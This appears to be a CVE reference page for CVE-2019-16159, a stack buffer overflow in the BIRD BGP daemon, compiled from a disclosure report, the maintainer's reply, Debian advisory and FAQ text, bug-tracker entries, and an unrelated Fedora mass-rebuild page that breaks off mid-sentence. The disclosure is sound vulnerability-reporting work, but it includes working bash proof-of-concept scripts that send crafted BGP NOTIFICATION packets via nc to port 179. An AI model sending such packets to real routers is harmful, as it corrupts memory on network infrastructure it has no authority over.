# CVE-2019-16159

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-16137.html) [[Index]](index.html) [[Next]](CVE-2019-16163.html)

### Upstream information

[CVE-2019-16159 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16159)

#### Description

BIRD Internet Routing Daemon 1.6.x through 1.6.7 and 2.x through 2.0.5 has a stack-based buffer overflow. The BGP daemon's support for RFC 8203 administrative shutdown communication messages included an incorrect logical expression when checking the validity of an input message. Sending a shutdown communication with a sufficient message length causes a four-byte overflow to occur while processing the message, where two of the overflow bytes are attacker-controlled and two are fixed.

Hi there,

I believe a stack overflow was introduced in the BGP protocol support of BIRD in
7ff34ca2[1] that allows a BGP peer to corrupt stack memory via crafted RFC
8203[0] BGP administrative shutdown communication message.

Leading with the best news, it looks like 7ff34ca2 hasn't been included in
a release yet :-) I didn't realize the bug was limited to this commit until the
very end of my analysis so I hope you'll indulge me in my detailed writeup. It
was as much to convince myself I wasn't wrong about my understanding as it was
to help make the fix easier. I've included a patch with a fix at the very end.

While I believe 7ff34ca2 introduced the ability to overflow a stack buffer it
seems to me the original RFC 8203 support hasn't been correctly verifying
shutdown communication `msg_len` since support was added in BIRD 2 versions >=
2.0.0 and BIRD 1 versions >= 1.6.4. Details to follow.

[0]: <https://tools.ietf.org/html/rfc8203>
[1]: <https://gitlab.labs.nic.cz/labs/bird/commit/7ff34ca2cb86f3947bf049f73e76e6ce5d57e4a8>

# Details

When BIRD receives a BGP packet with type 0x03 (`PKT_NOTIFICATION`) the packet
will make its way through the `bgp_rx`, `bgp_rx_packet`, and
`bgp_rx_notification` functions before being given to the `bgp_log_error`
function of `proto/bgp/packets.c`.

The `bgp_log_error` function allocates a fixed sized buffer on the stack
(`argbuf`), and a pointer to the start of the buffer (`t`):

```c
byte argbuf[256], *t = argbuf;
```

If the notification packet has major error code 0x06 (Cease), and minor error
code 0x02 or 0x04 (Administrative Shutdown or Administrative Reset) then
`bgp_log_error` invokes `bgp_handle_message` to handle the notification as a RFC
8203 shutdown communication. The `bgp_handle_message` function is provided as
arguments the notification packet data and the `t` pointer to `argbuf`.

```c
  /* RFC 8203 - shutdown communication */
  if (((code == 6) && ((subcode == 2) || (subcode == 4))))
    if (bgp_handle_message(p, data, len, &t))
      goto done;
```

The `bgp_handle_message` function attempts to verify that the packet data and
message data are properly sized by checking `msg_len` (populated from the RFC
8203 shutdown communication length field) and `len` (the overall read packet
length):

```c
  /* Handle proper message */
  if ((msg_len > 255) && (msg_len + 1 > len))
    return 0;
```

In BIRD revision 7ff34ca2 the first part of the expression was changed to:

```c
(msg_len > 255)
```

Where it was previously:

```c
(msg_len > 128)
```

This turns out to have been important for the scope of this bug because `argbuf`
is `256` bytes.

Later, post-verification the message is saved to the `bgp_proto` struct's
`message` field `using `proto_set_message`, and then written to `*bp` with
`bsprintf`.

```c
  proto_set_message(&p->p, msg, msg_len);
  *bp += bsprintf(*bp, ": \"%s\"", p->p.message);
  return 1;
```

Unfortunately the expression in the defensive "Handle proper message" check is
incorrect in two ways.

First, if `msg_len + 1` is > `len` but <= 255 then the defensive expression will
short-circuit as false and execution continues. This results in the
`proto_set_message` buffer being sized equal to `msg_len` but only filed with
`len` bytes (which may be 0) of provided message data. The unaccounted for
message bytes will contain uninitialized memory contents that will be written to
the log as part of the RFC 8203 shutdown communication.

Second, and more crucially, the `msg_len > 255` calculation fails to account for
the 4 extra bytes that will be written by the `bsprintf` formatting expression.
E.g. there will be three bytes that precede the `msg_len` message bytes (`: "`)
and one byte that follows them (`"`).

The `bsprintf` function from `lib/printf.c` specifically warns that without care
its use can result in buffer overflows:

```c
/**
 * This function is equivalent to bvsnprintf() with an infinite
 * buffer size and variable arguments instead of a &va_list.
 * Please use carefully only when you are absolutely
 * sure the buffer won't overflow.
 */
```

And indeed because of the miscalculation in `bgp_handle_message` a notification
message with `msg_len` >= 252 bytes and < 256 will cause `bsprintf` to
overflow the fixed
size `argbuf` buffer that is the target of the `bsprintf` write.

Sending a RFC 8203 shutdown communication notification that has a message length
of `0xFF` (255) will result in four bytes being written past the end of the
`argbuf` buffer into adjacent stack memory by the `bsprintf` invocation in
`bgp_handle_message`, two of them are attacker controlled and two are not (a `"`
from the end of the format specifier and a null byte added by `bgp_log_error`
after `bgp_handle_message` returns non-zero).

## RFC 8203-bis vs RFC 8203

Initially BIRD 2.0.0 and 1.6.4 added support for RFC 8203 as written. Section
2 of that RFC describes the shutdown communication packet fields saying of the
length:

> The length value MUST range from 0 to 128 inclusive. When the length value is
> zero, no Shutdown Communication field follows.

An update to RFC 8203, RFC 8203-bis updates the description of the length field
saying:

> Length: this 8-bit field represents the length of the Shutdown Communication
> field in octets. When the length value is zero, no Shutdown Communication
> field follows.

When the maximum `msg_len` allowed by BIRD was 128 it wasn't possible to run
past the end of the `argbuf` buffer. When the maximum allowed `msg_len` was
changed to 255 to support RFC 8203 the overflow becomes possible.

# Reproduction

## Memory leaked to log

Reproducing the leak of raw unitialized memory to the log file can be done by
sending an RFC 8203 shutdown notification with a large communication length
(`msg_len`) and no communication message to a BIRD instance with BGP support
configured to peer with the sending machine (e.g. one that will process the BGP
message without producing a "Unexpected connect from unknown address" error).
The peer does not have to be in an established state.

```bash
BGP_MARKER="\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
LEN="\x00\x16"   # 22 bytes (must be >= 22 or it will be rejected by
`bgp_rx_notification` or `bgp_handle_message` as being too short
TYPE="\x03"      # NOTIFICATION type
MAJOR_ERR="\x06" # Cease major error
MINOR_ERR="\x02" # Admin shutdown minor error
COMM_LEN="\xFF"  # 255 bytes, maximum allowed value for the one octet size field

# NOTE: Crucially the PKT does NOT have a message! It should have a 255 byte
# message but that has been deliberately omitted.
PKT="$BGP_MARKER\
$LEN$TYPE\
$MAJOR_ERR\
$MINOR_ERR\
$COMM_LEN"

printf "$PKT" | nc <BIRD IP> 179 >/dev/null
```

In the BIRD logs this will result in something like:

2019-09-08 16:58:03.023 <RMT> egpeer: Received: Administrative
shutdown: "¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾¾"

The content of the message will differ based on the runtime state of the BIRD
instance. In the above case it appears to be stack memory produced from building
with `-fsanitize=address`.

To reproduce against a version of BIRD >2.0.0 or >1.6.4 but older than 7ff34ca2
the `COMM_LEN` must be changed to be <= 128 bytes.

I don't believe this has security impact but someone more clever than me may be
able to find a way to use this to avoid the sanitization of low ASCII
characters (e.g. newlines, terminal control sequences, etc) in
`bgp_handle_message`. I mostly mention it because it's definitely buggy
behaviour.

## Stack overflow

Reproducing the stack overflow can be done by sending an RFC 8203 shutdown
notification with a communication length (`msg_len`) and message > 252 bytes to
a BIRD instance with BGP support configured to peer with the sending machine
(e.g. one that will process the BGP message without producing a "Unexpected
connect from unknown address" error). The peer does not have to be in an
established state.

```bash
BGP_MARKER="\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
LEN="\x00\x16"   # 22 bytes (must be >= 22 or it will be rejected by
`bgp_rx_notification` or `bgp_handle_message` as being too short
TYPE="\x03"      # NOTIFICATION
MAJOR_ERR="\x06" # Cease major error
MINOR_ERR="\x02" # Admin shutdown minor error
COMM_LEN="\xFF"  # 255 bytes
COMM=$(printf 'a%.0s' {1..253}) # 253 bytes of "a" to fill the true
available argbuf size
COMM="${COMM}!!" # two bytes of attacker controlled data to be written
past the end of argbuf

PKT="$BGP_MARKER\
$LEN$TYPE\
$MAJOR_ERR\
$MINOR_ERR\
$COMM_LEN\
$COMM"

printf "$PKT" | nc <BIRD IP> 179 >/dev/null
```

In practice I find the stack overflow does not impact the availability of the
BIRD instance when built with normal settings. I confirmed the overflow two
ways: with `gdb` and by building BIRD with `-fsanitize=address`.

### GDB verification

To verify the overflow I set a breakpoint in `bgp_handle_message` on L2971 (the
`bsprintf` call) and checked the memory at the end of the `argbuf` buffer before
and after the `bsprintf` call when processing the reproduction packet from
above.

2971  *bp += bsprintf(*bp, ": \"%s\"", p->p.message);
(gdb) x/6xb *bp +255
0x7fffffffdd2f: 0x00 0x60 0x09 0x6e 0x00 0x00
(gdb) n
2972  return 1;
(gdb) x/6xb 0x7fffffffdd30
0x7fffffffdd30: 0x21 0x21 0x22 0x00 0x00 0x00

Before the `bsprintf` call the 6 bytes after the end of `argbuf` (by way of the
`*bp` pointer) are:

```c
0x00 0x60 0x09 0x6e 0x00 0x00
```

If there was no overflow these bytes should remain the same since they are
beyond the end of `argbuf`. Instead after stepping forward past the `bsprintf`
call 4 of the 6 bytes change:

```c
0x21 0x21 0x22 0x00 0x00 0x00
```

These bytes match to `!!"\0`, showing the two attacker controlled bytes and the
two bytes unconditionally written.

### Address Sanitizer verification

It's also possible to quickly verify the overflow by using
`CFLAGS=-fsanitize=address LDFLAGS=-fsanitize=address` with `./configure` prior
to building BIRD.

Sending the reproduction to a BIRD built with ASAN results in an immediate stack
overflow detection and program termination:

The reported stack trace matches the analysis of the `bgp_log_error` and
`bgp_handle_message` functions shared above.

# Fix

I think the correct fix is to change the bounds checking in
`bgp_handle_message`. For readability I think it's clearest to break the
expression into two:

```diff
--- a/proto/bgp/packets.c
+++ b/proto/bgp/packets.c
@@ -2954,10 +2954,20 @@ bgp_handle_message(struct bgp_proto *p, byte
*data, uint len, byte **bp)
   uint msg_len = data[0];
   uint i;

+  /* Handle only messages that won't overflow *bp (accounting for the extra
+   * bytes from the `bsprintf` format */
+  if (msg_len >= 252)
+    return 0;
+
   /* Handle zero length message */
   if (msg_len == 0)
     return 1;

+  /* Handle only messages with a length that does not require reading past the
+   * end of the received data. */
+  if (msg_len < (len - 1))
+    return 0;
+
   /* Handle proper message */
   if ((msg_len > 255) && (msg_len + 1 > len))
     return 0;
```

After applying this fix both the uninitialized memory log write and the stack
overflow are prevented and malformed messages are logged defensively.

I'm not an especially adept C programmer so YYMV. You folks may have a more
elegant/less brittle fix in mind :-)

I think that the incorrect check in the original code also allows this
stack overflow, as a properly packed 255B message would trigger the first
condition but not the second, so would be accepted.

Therefore, the stack overflow could happen on BIRD 1 versions >= 1.6.4
and BIRD 2 versions >= 2.0.0.

The bugfix patches are:
1657c41c96b3c07d9265b07dd4912033ead4124b (1.6.x)
8388f5a7e14108a1458fea35bfbb5a453e2c563c (2.0.x)

Package        : bird
CVE ID         : CVE-2019-16159

Daniel McCarney discovered that the BIRD internet routing daemon
incorrectly validated RFC 8203 messages in it's BGP daemon, resulting
in a stack buffer overflow.

For the stable distribution (buster), this problem has been fixed in
version 1.6.6-1+deb10u1. In addition this update fixes an incomplete
revocation of privileges and a crash triggerable via the CLI (the latter
two bugs are also fixed in the oldstable distribution (stretch) which is
not affected by CVE-2019-16159).

We recommend that you upgrade your bird packages.

For the detailed security status of bird please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/bird>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

| [Description](show_bug.cgi?id=1751031#c0)  Dhananjay Arunesh    2019-09-11 04:53:56 UTC  ``` A vulnerability was found in BIRD Internet Routing Daemon 1.6.x through 1.6.7 and 2.x through 2.0.5 has a stack-based buffer overflow. The BGP daemon's support for RFC 8203 administrative shutdown communication messages included an incorrect logical expression when checking the validity of an input message. Sending a shutdown communication with a sufficient message length causes a four-byte overflow to occur while processing the message, where two of the overflow bytes are attacker-controlled and two are fixed.

### BGP: Fix bugs in handling of shutdown messages

```

There is an improper check for valid message size, which may lead to
stack overflow and buffer leaks to log when a large message is received.

Thanks to Daniel McCarney for bugreport and analysis.

Hi

Yes, you are right, thanks for detailed writeup.

> Leading with the best news, it looks like 7ff34ca2 hasn't been included in

Unfortunately it has been included in released versions 1.6.7 and 2.0.5.

Yes, seems like switched && for ||.

Note that the purpose of this check was not a check for buffer size, but
a check for validity of input message (max 128 B according to RFC 8203).
It is unnecessary with draft-rfc8203bis, as all possible lengths are
permitted.

This seems incorrect: msg_len is the nominal message length, while len is
remaining length of the packet, so the check for nominal message not
fitting into the packet would be:

 if (msg_len + 1 > len)
    return 0;

For the stack buffer, the proper fix seems to be just enlarge it to fit
max-size message.

The stack overflow seems limited, i would like to check what exactly is
overwritten when built with normal settings.

Once more, thanks for bugreport and the detailed writeup.

Package        : bird
CVE ID         : CVE-2019-16159

Daniel McCarney discovered that the BIRD internet routing daemon
incorrectly validated RFC 8203 messages in it's BGP daemon, resulting
in a stack buffer overflow.

For the stable distribution (buster), this problem has been fixed in
version 1.6.6-1+deb10u1. In addition this update fixes an incomplete
revocation of privileges and a crash triggerable via the CLI (the latter
two bugs are also fixed in the oldstable distribution (stretch) which is
not affected by CVE-2019-16159).

We recommend that you upgrade your bird packages.

For the detailed security status of bird please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/bird>

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

### BGP: Fix bugs in handling of shutdown messages

```

There is an improper check for valid message size, which may lead to
stack overflow and buffer leaks to log when a large message is received.

Thanks to Daniel McCarney for bugreport and analysis.

| [Description](show_bug.cgi?id=1150108#c0)  Alexander Bergmann   2019-09-10 07:22:10 UTC  ``` CVE-2019-16159  BIRD Internet Routing Daemon 1.6.x through 1.6.7 and 2.x through 2.0.5 has a stack-based buffer overflow. The BGP daemon's support for RFC 8203 administrative shutdown communication messages included an incorrect logical expression when checking the validity of an input message. Sending a shutdown communication with a sufficient message length causes a four-byte overflow to occur while processing the message, where two of the overflow bytes are attacker-controlled and two are fixed.

# The BIRD Internet Routing Daemon

**The BIRD** project aims to develop a fully functional dynamic IP routing daemon
primarily targeted on (but not limited to) Linux, FreeBSD and other UNIX-like systems and distributed
under the [GNU General
Public License](http://www.gnu.org/copyleft/copyleft.html).

10.1.2025 - New release 3.0.1 and 2.16.1! Bugfixing releases

What do we support:

* Both IPv4 and IPv6
* Multiple routing tables
* BGP
* RIP
* OSPF
* BFD
* Babel
* Static routes
* IPv6 Router Advertisements
* Inter-table protocol
* Command-line interface (using the `birdc' client; to get
  some help, just press `?')
* Powerful language for route filtering
* Linux, FreeBSD, NetBSD, OpenBSD ports

**BIRD** was developed as a school project at [Faculty
of Math and Physics](http://www.mff.cuni.cz/), [Charles University](http://www.cuni.cz/) Prague.
Currently it is developed and supported by [CZ.NIC Labs](http://labs.nic.cz).
Current **BIRD** team members are:

* [Ondřej Filip](http://feela.network.cz/) (OSPF, BSD port, releases, packaging)
* [Martin Mareš](http://mj.ucw.cz/) (overall architecture, core, dumps, BGP)
* [Ondřej Zajíček](http://artax.karlin.mff.cuni.cz/~zajio1am/) (New BGP features, OSPFv3, BFD)
* [Maria Matějka](http://mq.ucw.cz/) (MPLS, filters, multithreading)

Former **BIRD** team members were
[Libor Forst](http://www.ms.mff.cuni.cz/~forst/) and
[Pavel Machek](http://atrey.karlin.mff.cuni.cz/~pavel/).

## Goal

The goal is to rebuild every single Fedora package, regardless of
content, before the Fedora 31 Change Deadline.

## Driving Features

* [Automatic R runtime dependencies](/wiki/Changes/Automatic_R_runtime_dependencies "Changes/Automatic R runtime dependencies")
* [Python means Python3](/wiki/Changes/Python_means_Python3 "Changes/Python means Python3")
* [The GNU C Library version 2.30](/wiki/Changes/GLIBC230 "Changes/GLIBC230")
* [Switch RPMs to zstd compression](/wiki/Changes/Switch_RPMs_to_zstd_compression "Changes/Switch RPMs to zstd compression")
* [Changes/MinGW environment and toolchain update](/wiki/Changes/MingwEnvToolchainUpdate "Changes/MingwEnvToolchainUpdate")
* [Golang 1.13](/wiki/Changes/golang1.13 "Changes/golang1.13")

## Schedule

Given the changes required for the above features and the given
schedules, Release Engineering will be ready to start scripted rebuilds
on Wednesday, July 24th. All automated rebuilds should be finished prior to the Feature Freeze.
Any clean-up manual rebuilds should be finished prior to the Beta Change Deadline.

## Scripts

Release Engineering has created two scripts. One is to initiate the builds, and the other is to query for items still needing to be built.

### Build Initiation

The rebuild [script](https://pagure.io/releng/blob/master/f/scripts/mass-rebuild.py) works in the following way:

```
 Generate a list of all packages in f31
 Loop through each package:
   Query if a build has already been attempted/completed since koji changes went live.
   If so, move to next package
   If not, check out git
   rpmdev-bumpspec
   fedpkg commit -cp
   fedpkg (background) build
   Move on to next package

```

Each step will have some error catching and logging so that people
can clean up the various failures for whatever reasons. The builds will
be background builds, which will allow other builds done to take higher
priority when a builder has a free slot. However maintainers should
take care when doing this so that the background build won't take
